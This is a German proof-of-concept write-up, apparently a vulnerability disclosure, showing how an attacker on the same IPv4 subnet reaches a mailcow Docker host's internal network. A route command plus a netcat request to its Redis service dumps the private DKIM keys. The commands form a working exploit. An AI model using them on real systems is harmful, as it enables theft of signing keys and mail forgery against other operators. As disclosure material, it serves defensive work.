# Proof of Concept

Der Testaufbau besteht aus zwei Systemen, die nichts miteinander zu tun haben, sich aber im gleichen IPv4-Subnetz befinden. Diese Situation kommt nicht nur im (vertrauenswürdigen) LAN vor, auch bei vielen Hostingprovidern teilt man sich das Netzwerk oftmals mit hunderten/tausenden anderen (potentiell nicht vertrauenswürdigen) Serverkunden. Für das Beispiel wird davon ausgegangen, dass sich beide Systeme in `203.0.113.0/24` befinden und `IPV4_NETWORK` in der `mailcow.conf` nicht verändert wurde. Sobald ein Router oder eine (vom Docker-Host unabhängige) Firewall zwischen den beiden Systemen hängt, funktioniert der Angriff in der Regel nicht mehr!

* __mailcow__ [`203.0.113.11`]: _mailcow System mit Docker_
* __badguy__  [`203.0.113.66`]: _System des Angreifers_

Beide Systeme werden zuerst mit einem Debian 12 ISO-Image installiert, bei dem nur der SSH-Daemon läuft, also eine klassische Minimalinstallation.

## mailcow installieren

Nun wird mailcow 2024-01a auf dem System `203.0.113.11` anhand der [Dokumentation](https://docs.mailcow.email/getstarted/install/) installiert und gestartet:

```
  root@mailcow:~# curl -sSL https://get.docker.com/ | CHANNEL=stable sh
  root@mailcow:~# systemctl enable --now docker
  root@mailcow:~# apt update
  root@mailcow:~# apt install docker-compose-plugin
  root@mailcow:~# cd /opt
  root@mailcow:/opt# git clone https://github.com/mailcow/mailcow-dockerized
  root@mailcow:/opt# cd mailcow-dockerized
  root@mailcow:/opt/mailcow-dockerized# ./generate_config.sh
  root@mailcow:/opt/mailcow-dockerized# docker compose pull
  root@mailcow:/opt/mailcow-dockerized# docker compose up -d
```

## Alle Daten von Redis auslesen

Nun kann der Angreifer auf seinem System `203.0.113.66` bereits auf das fremde Mailcow-Netzwerk zugreifen:

```
  root@badguy:~# ip route add 172.22.1.0/24 via 203.0.113.11
  root@badguy:~# echo -e 'HGETALL DKIM_PRIV_KEYS\r\nQUIT' | netcat 172.22.1.249 6379
```

In diesem Beispiel werden die privaten (!) DKIM-Schlüssel der fremden Instanz ausgelesen. Wenn noch keine DKIM-Schlüssel existieren, sieht die Ausgabe so aus:

```
  *0
  +OK
```

Sollten auf dem mailcow-System aber bereits DKIM-Schlüssel hinterlegt sein, wird man zahlreiche Blöcke dieser Art sehen:

```
  -----BEGIN PRIVATE KEY-----
  […]
  -----END PRIVATE KEY-----
```

## IPv6 ist nicht betroffen

IPv6 scheint nicht betroffen zu sein, weil die genannten internen Dienste ausschließlich über IPv4 erreichbar sind.
